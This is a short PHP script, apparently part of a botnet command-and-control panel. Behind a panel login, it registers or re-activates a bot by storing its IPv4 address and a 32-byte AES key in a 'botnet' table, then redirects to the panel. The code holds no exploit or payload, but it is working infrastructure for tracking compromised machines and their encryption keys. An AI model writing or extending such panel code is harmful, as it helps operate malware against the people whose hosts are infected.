<?php
include 'panel_login.php';

include 'sql_connect.php';

// ===== 讀取 GET 參數 =====
$ip  = isset($_POST['ip'])  ? trim($_POST['ip'])  : null;
$key = isset($_POST['key']) ? $_POST['key'] : null;



if (!$ip || !$key) {
    die("缺少必要參數 ip 或 key");
}

if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    die("ip 格式錯誤");
}

if (!ctype_xdigit($key) || strlen($key) !== 64) {
    die("key 必須是 64 個 hex 字符（32 bytes）");
}

$ip_bin = inet_pton($ip);

// Debug（測試用）
// var_dump($ip_bin, strlen($ip_bin));

// 修改點：使用 ON DUPLICATE KEY UPDATE 語法
// 如果 IP 已存在（主鍵衝突），則執行 UPDATE 後面的動作：
// 1. 更新 aes_key
// 2. 將 is_deleted 設回 0
// 3. 重置 last_alive_time
$sql = "
    INSERT INTO botnet (ip, aes_key, last_alive_time, is_deleted)
    VALUES (?, UNHEX(?), 0, 0)
    ON DUPLICATE KEY UPDATE
    aes_key = UNHEX(?),
    is_deleted = 0,
    last_alive_time = 0
";

$stmt = mysqli_prepare($conn, $sql);

// ⭐⭐⭐ bind_param 修改：
// 因為 SQL 中有三個問號佔位符（VALUES 裡的 ip, key 和 UPDATE 裡的 key），所以這裡是 "sss"
// 參數順序為：$ip_bin (插入用), $key (插入用), $key (更新用)
mysqli_stmt_bind_param($stmt, "sss", $ip_bin, $key, $key);

if (mysqli_stmt_execute($stmt)) {
    header("Location: panel.php");
    exit;
} else {
    echo "操作失敗: " . mysqli_error($conn);
}

mysqli_stmt_close($stmt);
mysqli_close($conn);
?>